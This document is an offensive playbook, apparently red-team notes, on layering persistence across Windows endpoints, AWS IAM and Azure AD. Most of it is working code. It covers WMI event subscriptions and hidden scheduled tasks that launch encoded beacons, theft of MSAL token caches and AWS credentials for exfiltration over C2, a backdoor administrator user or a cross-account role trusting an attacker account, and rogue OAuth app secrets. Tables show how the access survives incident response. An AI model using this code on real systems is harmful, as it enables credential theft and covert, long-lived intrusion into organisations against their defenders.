# Layered persistence

Combining identity-based, cloud, and endpoint persistence mechanisms so that
removing one layer does not end access. Each layer uses a different control
plane; a responder who finds and removes one will not automatically find the
others.

## Prerequisites

- Valid session on at least one domain-joined host with local admin rights
- Azure AD or AWS credentials accessible on that host
- Outbound HTTPS permitted from the host

## Phase 1: secure the endpoint layer first

Before touching identity or cloud, establish endpoint persistence that will
survive a password reset.

```powershell
# WMI subscription: fileless, survives reboot, not visible in Task Scheduler
$filterArgs = @{
    Name           = 'WindowsUpdateHealth'
    EventNamespace = 'root\cimv2'
    QueryLanguage  = 'WQL'
    Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 720
                      WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs

$consumerArgs = @{
    Name                = 'WindowsUpdateHealth'
    CommandLineTemplate = 'powershell.exe -w hidden -nop -enc IMPLANT_BEACON'
}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer `
    -Namespace root\subscription -Arguments $consumerArgs

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription `
    -Arguments @{ Filter = $filter; Consumer = $consumer }
```

The WMI layer does not depend on any credential. Even after all credentials are
rotated, the implant will continue to beacon.

## Phase 2: establish identity layer

From the active session, steal and exfiltrate tokens before they are revoked.

```powershell
# locate and read Azure CLI token cache
$msal = "$env:LOCALAPPDATA\.IdentityService\msal.cache"
if (Test-Path $msal) {
    Add-Type -AssemblyName System.Security
    $raw = [System.IO.File]::ReadAllBytes($msal)
    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect(
        $raw, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    $tokens = [System.Text.Encoding]::UTF8.GetString($dec)
    # exfiltrate $tokens via C2 channel
}

# AWS: read long-term credentials if present
$awsCreds = "$env:USERPROFILE\.aws\credentials"
if (Test-Path $awsCreds) { Get-Content $awsCreds }  # exfiltrate via C2
```

Transfer stolen tokens to infrastructure outside the target environment before
proceeding. If the session is lost these tokens are no longer reachable.

## Phase 3: establish cloud IAM layer

Using the exfiltrated tokens from a clean environment, create cloud persistence
that survives host-level incident response entirely.

```python
import boto3, json

iam = boto3.client('iam',
    aws_access_key_id=STOLEN_KEY,
    aws_secret_access_key=STOLEN_SECRET)

# option A: backdoor IAM user (higher visibility)
iam.create_user(UserName='cloudwatch-metric-exporter')
iam.attach_user_policy(
    UserName='cloudwatch-metric-exporter',
    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
key = iam.create_access_key(UserName='cloudwatch-metric-exporter')['AccessKey']
# store key['AccessKeyId'] and key['SecretAccessKey'] in attacker infrastructure

# option B: cross-account role (preferred; no new user, lower visibility)
trust = json.dumps({
    "Version": "2012-10-17",
    "Statement": [{
        "Effect": "Allow",
        "Principal": {"AWS": f"arn:aws:iam::{ATTACKER_ACCOUNT}:root"},
        "Action": "sts:AssumeRole",
        "Condition": {"StringEquals": {"sts:ExternalId": "ops-2024"}}
    }]
})
iam.create_role(RoleName='aws-ops-sync-role', AssumeRolePolicyDocument=trust)
iam.attach_role_policy(
    RoleName='aws-ops-sync-role',
    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
```

Verify the cloud layer works from a clean, non-target environment before
continuing.

## Phase 4: establish identity layer (OAuth app)

An OAuth application credential persists independently of any individual user
account. If the compromised user's account is disabled, the app credential
remains valid.

```python
import requests

headers = {'Authorization': f'Bearer {azure_access_token}',
           'Content-Type': 'application/json'}

# create a new application registration
app = requests.post('https://graph.microsoft.com/v1.0/applications',
    headers=headers,
    json={
        'displayName': 'Azure Monitor Connector',
        'signInAudience': 'AzureADMyOrg'
    }).json()

# add a client secret with a two-year lifetime
secret = requests.post(
    f"https://graph.microsoft.com/v1.0/applications/{app['id']}/addPassword",
    headers=headers,
    json={'passwordCredential': {
        'displayName': 'sync-key',
        'endDateTime': '2027-01-01T00:00:00Z'
    }}).json()

# add service principal and assign Directory.Read.All or higher
sp = requests.post('https://graph.microsoft.com/v1.0/servicePrincipals',
    headers=headers,
    json={'appId': app['appId']}).json()

print(f"app_id: {app['appId']}")
print(f"client_secret: {secret['secretText']}")
print(f"tenant: {TENANT_ID}")
```

Store these credentials. They survive deletion of the compromised user account
and rotation of all human credentials.

## Phase 5: add a scheduled task as a second endpoint layer

A second endpoint mechanism with different detection characteristics from WMI:

```powershell
# scheduled task registered under a Microsoft path, triggers at logon
$action   = New-ScheduledTaskAction -Execute 'powershell.exe' `
              -Argument '-w hidden -nop -enc IMPLANT_BEACON_2'
$trigger  = New-ScheduledTaskTrigger -Daily -At '08:15' `
              -RandomDelay (New-TimeSpan -Minutes 30)
$settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit ([TimeSpan]::Zero)
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' `
               -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask `
    -TaskPath '\Microsoft\Windows\ApplicationExperience\' `
    -TaskName 'ProgramDataUpdater' `
    -Action $action -Trigger $trigger `
    -Settings $settings -Principal $principal -Force
```

Using a different task path and name from any WMI-associated names reduces
correlation between the two endpoint layers.

## Verification matrix

Before finishing the engagement, confirm each layer independently from a clean
environment:

| Layer | Verification method |
| ----- | ------------------- |
| WMI subscription | Wait for beacon from target host after session close |
| AWS IAM user or cross-account role | `aws sts get-caller-identity` with backdoor credentials |
| Azure OAuth app | `POST .../oauth2/v2.0/token` with client_id and client_secret |
| Scheduled task | `Get-ScheduledTask -TaskPath '\Microsoft\Windows\ApplicationExperience\'` |

## Incident response resilience

| IR action | Layers affected | Layers remaining |
| --------- | --------------- | ---------------- |
| Password reset for compromised user | None (tokens already stolen) | All |
| User account disabled | Endpoint, cloud IAM | Cloud IAM, OAuth app |
| Host reimaged | WMI, scheduled task | Cloud IAM, OAuth app, identity tokens |
| Cloud IAM sweep (new users/roles removed) | AWS IAM | OAuth app (Azure) |
| Azure app registration audit | OAuth app | AWS cross-account role, endpoint |
| Full cloud account reset | Cloud IAM, OAuth app | Endpoint (if host not reimaged) |

Full removal requires simultaneous action across all control planes. Sequential
IR actions give time to re-establish a removed layer before the next sweep.

## Cleanup (after engagement)

Remove all layers in reverse order of creation:

```text
# 1. remove OAuth app / service principal (Azure portal or az cli)
az ad app delete --id APP_OBJECT_ID

# 2. remove AWS IAM entities
aws iam detach-user-policy --user-name cloudwatch-metric-exporter \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-access-key --user-name cloudwatch-metric-exporter --access-key-id KEY
aws iam delete-user --user-name cloudwatch-metric-exporter
# or for cross-account role:
aws iam detach-role-policy --role-name aws-ops-sync-role \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-role --role-name aws-ops-sync-role

# 3. remove scheduled task (on target host)
Unregister-ScheduledTask -TaskName 'ProgramDataUpdater' `
  -TaskPath '\Microsoft\Windows\ApplicationExperience\' -Confirm:$false

# 4. remove WMI subscription (on target host)
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding |
  Where-Object { $_.Filter -like '*WindowsUpdateHealth*' } | Remove-WmiObject
Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer |
  Where-Object { $_.Name -eq 'WindowsUpdateHealth' } | Remove-WmiObject
Get-WMIObject -Namespace root\subscription -Class __EventFilter |
  Where-Object { $_.Name -eq 'WindowsUpdateHealth' } | Remove-WmiObject
```

Verify removal of each layer after cleanup. Document what was placed and what
was removed in the engagement report.
